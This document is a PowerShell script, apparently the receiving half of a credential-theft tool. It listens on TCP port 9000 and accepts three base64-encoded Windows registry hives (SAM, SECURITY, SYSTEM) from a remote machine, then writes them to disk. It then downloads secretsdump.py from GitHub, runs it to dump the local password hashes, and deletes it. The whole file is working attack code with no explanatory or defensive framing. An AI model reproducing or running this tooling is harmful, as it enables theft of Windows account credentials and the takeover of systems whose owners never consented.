function Invoke-Reciever {
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    Write-Host
    Write-Host
    Write-Host Starting Server...

    $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
    $listener = new-object System.Net.Sockets.TcpListener $endpoint
    $listener.start()
    $length1 = New-Object byte[] 1024
    $length2 = New-Object byte[] 1024
    $length3 = New-Object byte[] 1024

    Write-Host Waiting For Connection...

    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    Write-Host Connected
    Write-Host
    Write-Host Recieveing Data...

    $stream.read($length1, 0, $length1.Length)
    $stream.Write('0',0,1)
    $stream.read($length2, 0, $length2.Length)
    $stream.Write('0',0,1)
    $stream.read($length3, 0, $length3.Length)
    0..([int]($length1.Length)-1) | ForEach-Object {if ($length1[$_] -ne 0){$size1+=[text.encoding]::ASCII.GetString($length1[$_])}}
    0..([int]($length2.Length)-1) | ForEach-Object {if ($length2[$_] -ne 0){$size2+=[text.encoding]::ASCII.GetString($length2[$_])}}
    0..([int]($length3.Length)-1) | ForEach-Object {if ($length3[$_] -ne 0){$size3+=[text.encoding]::ASCII.GetString($length3[$_])}}
    $byte1 = New-Object byte[] $size1
    $byte2 = New-Object byte[] $size2
    $byte3 = New-Object byte[] $size3
    $stream.Write('0',0,1)
    $stream.read($byte1, 0, $byte1.Length)
    $stream.Write('0',0,1)
    $stream.read($byte2, 0, $byte2.Length)
    $stream.Write('0',0,1)
    $stream.read($byte3, 0, $byte3.Length)

    Write-Host Recieved all Data
    Write-Host
    Write-Host Stopping Server
    Write-Host

    $listener.Stop()
    $listener.Server.Dispose()

    Write-Host Starting Data Processing...
    Write-Host Processing SAM

    $msg1 = [text.encoding]::ASCII.GetString($byte1)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SAM'), [Convert]::FromBase64String($msg1))

    Write-Host Processed SAM
    Write-Host Processing SECURITY

    $msg2 = [text.encoding]::ASCII.GetString($byte2)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SECURITY'), [Convert]::FromBase64String($msg2))

    Write-Host Processed SECURITY
    Write-Host Processing SYSTEM

    $msg3 = [text.encoding]::ASCII.GetString($byte3)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SYSTEM'), [Convert]::FromBase64String($msg3))

    Write-Host Processed SYSTEM
    Write-Host
    Write-Host Finished Processing
    Write-Host
    Write-Host Dumping Hashes With secretsdump.py
    Write-Host
    Write-Host

    wget "http://raw.github.com/mo-tec/HashExtractor/master/secretsdump.py" -UseBasicParsing -out (Join-Path (resolve-path './') '/secretsdump.py')
    .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
    del ./secretsdump.py
}
Invoke-Reciever